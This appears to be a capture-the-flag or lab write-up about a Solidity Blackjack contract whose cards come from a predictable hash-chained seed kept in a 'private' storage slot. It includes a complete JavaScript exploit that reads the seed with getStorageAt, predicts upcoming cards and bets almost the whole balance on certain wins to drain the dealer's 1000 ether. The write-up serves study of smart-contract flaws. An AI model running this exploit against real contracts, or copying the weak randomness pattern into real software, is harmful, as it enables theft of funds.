# Blackjack

The smart contract is using a seed to randomly draw cards for the black jack players.
The seed is initialised when the contract is deployed and on each card pick a new seed is generated using the previous seed.

```solidity
contract Blackjack {

	// ...

	uint private randomSeed;

	// ...

	constructor(uint seed) payable {
		dealer = payable(msg.sender);
		randomSeed = seed;
		round = 0;
		end_game();
	}

	// ...

	function drawCard() private returns (uint) {
		randomSeed = uint(keccak256(abi.encodePacked(randomSeed)));
		uint card = (randomSeed % 13) + 1;
		return card;
	}

	// ...
}
```

The attacker will have to:
1. recover the private variable `randomSeed`
2. emulate the random seed generation function for drawing cards
3. forsee the cards that will be distributed next
4. use the knowledge of the next cards to beat the dealer multiple times on the blackjack game

The smart contract (dealer) will start with a 1000 ether ballance.
The player will start with 10 ether ballance.

The following exploit can be run on the browser's Javascript console and exploit the game by betting (almost) all the user's ethers when the cards to be given to the user add up to 21, otherwise a small bet will be placed just to generate a new randomSeed. This will ensure that eventually the player will empty the smart contacts's account.

```javascript
let EmulateSeed = {
	// Get the current seed saved on the smart contract 
	loadSeed : async function() {
		this.randomSeed = web3.utils.hexToNumberString(
			await web3.eth.getStorageAt(contract.options.address, 6 - 1) // The randomSeed is the 5th attribute (-1 as it starts from zero)
		);
	},

	// Emulate the darw card function of the smart contract
	drawCard : function() {
		// Update the seed
		this.randomSeed = web3.utils.hexToNumberString(web3.utils.soliditySha3(this.randomSeed));
		// Generate the card number
		let card = parseInt(BigInt(this.randomSeed) % BigInt('13')) + 1;
		return card;
	}
}

// Calculate score based on cards
let calculateScore = function(cards) {
	let score = cards.map(x => x == 1 ? 11 : x > 10 ? 10 : x).reduce((s, a) => s + a, 0);
	if (score > 21) {
		let aces = cards.filter(x => x == 1).length;
		while (score > 21 && aces > 0) {
			score -= 10;
			aces --;
		}
	}
	return score;
}

// Cheat a game by peeking at the cards
// Your cheater here is not a nobel winning cheater, but it gets the job done
let cheatPlay = async function() {
	await EmulateSeed.loadSeed();

	// Peek cards
	let dealer = [EmulateSeed.drawCard()];
	let player = [EmulateSeed.drawCard(), EmulateSeed.drawCard()];

	// Check my score
	let player_score = calculateScore(player);
	let dealer_score = 0;

	let balance = Web3.utils.fromWei(await web3.eth.getBalance(account.address), 'ether');
	let amount = '0.001';
	let hit = 0;
	let ensure_win = false;
	if (player_score == 21) {
		amount = Math.floor(parseFloat(balance) - 0.1).toString();
		ensure_win = true;
	}
	else {
		do {
			player.push(EmulateSeed.drawCard());
			player_score = calculateScore(player);
			hit ++;
		} while (player_score < 21);

		if (player_score == 21) {
			amount = Math.floor(parseFloat(balance) - 0.1).toString();
			ensure_win = true;
		}
		else if (player_score > 21) {
			hit --;
			dealer.push(player.pop());
			player_score = calculateScore(player);
			dealer_score = calculateScore(dealer);
			while (dealer_score < player_score) {
				dealer.push(EmulateSeed.drawCard());
				dealer_score = calculateScore(dealer);
			}
			if (player_score > dealer_score || dealer_score > 21) {
				amount = Math.floor(parseFloat(balance) - 0.1).toString();
				ensure_win = true;
			}
		}
	}

	console.log('Amount to bet', amount);
	await blackjack.bet(Web3.utils.toWei(amount, 'ether'));
	if (ensure_win && hit > 0) {
		for (let i = 0; i < hit; i++) {
			await blackjack.hit();
		}
	}
	await blackjack.stand();
	return ensure_win ? amount : 0;
}


// We will cheat untill we bet 500 so that we can get all 1000 that the casino holds
for (let j = 0; j < 200; j++) {
	let result = await cheatPlay();
	if (result > 500) break;
}

```
